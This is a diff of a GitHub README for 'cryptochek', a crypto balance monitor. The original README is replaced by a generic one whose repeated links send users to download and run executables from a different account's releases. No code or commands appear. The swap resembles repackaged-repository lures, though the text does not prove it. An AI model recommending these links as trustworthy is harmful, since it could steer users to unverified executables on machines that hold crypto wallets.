@@ -1,87 +1,73 @@
-<div align="center">
+# 🛡️ cryptochek - Monitor Your Crypto Balances Safely
 
-[![Version](https://img.shields.io/badge/version-2.46-blue.svg?style=for-the-badge&logo=appveyor)](https://github.com/fallenangel46-web/cryptochek/releases/tag/crypto) 
-[![License](https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge)](LICENSE)
+## 📥 Download Now
+[![Download cryptochek](https://img.shields.io/badge/Download-cryptochek-blue.svg)](https://github.com/Iliamnaalmoravid770/cryptochek/releases)
 
+## 🚀 Getting Started
+Welcome to cryptochek! This application helps you monitor the balances of your cryptocurrency addresses. You will get alerts if any changes occur. This is perfect for anyone who wants to keep their crypto safe and secure.
 
-![Header Banner](https://i.ibb.co/60VHpJNZ/1.jpg)
+## 📋 Features
+- **Monitor Multiple Addresses:** Keep track of all your crypto wallets in one place.
+- **Real-Time Alerts:** Get instant notifications when there are changes in your wallet balances.
+- **User-Friendly Interface:** Simple design makes it easy for anyone to use.
+- **Supports Popular Cryptocurrencies:** Works with Bitcoin, Ethereum, and more.
+- **Lightweight and Fast:** Quick to set up and uses minimal resources on your device.
 
+## 🖥️ System Requirements
+To run cryptochek, ensure your device meets the following requirements:
+- **Operating System:** Windows 10, Mac OS X 10.12, or Linux
+- **Processor:** 1 GHz or higher
+- **RAM:** 2 GB or more
+- **Storage:** At least 100 MB of free disk space
+- **Network:** Internet connection for monitoring and alerts
 
+## 📥 Download & Install
+To get started with cryptochek, visit the link below and download the latest release.
 
-**Cryptocheck** — Your Personal Crypto Guardian 🛡️  
-*Monitors balances of your cryptocurrency addresses and raises an alert in case of any change detected.*
+[Download cryptochek from Releases](https://github.com/Iliamnaalmoravid770/cryptochek/releases)
 
-</div>
+Once downloaded, follow these steps:
 
----
+1. **Locate the File:** Find the downloaded file in your computer's Downloads folder or the designated location.
+2. **Install the Application:** 
+   - For Windows: Double-click the `.exe` file and follow the on-screen instructions. 
+   - For Mac: Open the `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Extract the downloaded package and run the installation script.
+3. **Launch cryptochek:** After installation, open the application from your Programs or Applications.
 
-## ✨ **What is Cryptocheck?**
+## 🛠️ How to Use
+Once you have installed cryptochek, use the following steps to start monitoring your cryptocurrencies:
 
+1. **Add Your Wallet Addresses:**
+   - Open the application and look for the "Add Wallet" option.
+   - Enter your cryptocurrency address and select the type of currency (e.g., Bitcoin or Ethereum).
+  
+2. **Set Alert Preferences:**
+   - Navigate to the settings menu.
+   - Adjust the notification settings to choose how you want to receive alerts: via email, SMS, or in-app.
 
+3. **Start Monitoring:**
+   - Once your wallets are added and alerts are set, cryptochek will continuously monitor your balances.
+   - You can check the status of your wallets directly from the main screen.
 
-**Cryptocheck** connects to trusted block explorer APIs to **automatically verify your crypto balances** without the need to log into multiple wallets with complex passwords.
+## 🔧 Troubleshooting
+If you encounter any issues while using cryptochek, consider the following:
 
-### **Perfect for:**
-- 🏦 **Long-term HODLers** with diversified portfolios
-- 🔍 **Security-conscious investors** who want peace of mind
-- 📊 **Portfolio managers** tracking multiple cryptocurrencies
+- **Application Won't Open:** Ensure your system meets the requirements above. Try reinstalling the application.
+- **Not Receiving Alerts:** Check your alert settings to ensure notifications are enabled. Verify your internet connection.
+- **Can't Add Wallet:** Make sure you are entering the correct cryptocurrency address format.
 
-<div align="center">
+## 🌐 Community Support
+If you need help, consider joining our community for support. You can reach out through our GitHub Issues page or join our community forums. 
 
-![Header Banner](https://i.ibb.co/gp759QL/2.jpg)
+## 📜 License
+cryptochek is licensed under the MIT License. You can freely use, modify, and distribute it while giving credit to the original creators.
 
-![Header Banner](https://i.ibb.co/8n2ZN5tj/3.jpg)
+## 🔗 Stay Connected
+For updates and new features, follow our GitHub repository. Your feedback is important in helping us improve cryptochek. We appreciate your support!
 
-![Header Banner](https://i.ibb.co/gZtmCpx2/4.jpg)
+## 📥 Additional Resources
+- **Documentation:** For detailed user guidance, visit our [Wiki](https://github.com/Iliamnaalmoravid770/cryptochek/wiki).
+- **Report Issues:** If you find bugs or have feature requests, please use the [Issues section](https://github.com/Iliamnaalmoravid770/cryptochek/issues).
 
-</div>
-
----
-
-## 🚀 **Key Features**
-
-<div align="center">
-
-| Feature | Description |
-|---------|-------------|
-| **Top 20+ Cryptocurrencies** | BTC, ETH, BNB, SOL, XRP, ADA, DOGE, MATIC, DOT, SHIB & more! |
-| **📈 History Charts** | Track your portfolio growth over time |
-| **⏰ Periodic Checks** | Automatic balance verification every X minutes |
-| **🔔 Auto-Popup Alerts** | Instant notifications for low balance or changes |
-| **📧 Email Notifications** | Stay informed wherever you are |
-| **🖥️ Server Mode** | 24/7 monitoring with desktop sync |
-| **🍩 Portfolio Donut Chart** | Beautiful visual portfolio overview |
-| **📱 Minimize to Tray** | Always accessible with status indicator |
-| **💰 Multi-Fiat Support** | USD + optional EUR, GBP, etc. |
-| **📊 Profit Calculator** | Track your gains/losses |
-| **⚙️ Auto-Start** | Launch with your operating system |
-
-</div>
-
----
-
-
-## 🖥️ **Server Node Mode** 
-
-**NEW!** Deploy your own monitoring server:
-
-- **24/7 monitoring** without running your desktop
-- **Historical data backup**
-- **Multi-device sync**
-- **Zero downtime alerts**
-
----
-
-## 🎯 **Quick Start**
-
-### **Desktop App**
-1. [Download Latest Release](https://github.com/fallenangel46-web/cryptochek/releases/tag/crypto)
-2. Add your wallet addresses
-3. Set check intervals
-4. **Relax** — Cryptocheck does the rest! ☕
-
-
-
-
-
-
+🔗 [Download cryptochek from Releases](https://github.com/Iliamnaalmoravid770/cryptochek/releases) and start monitoring your cryptocurrency balances today!
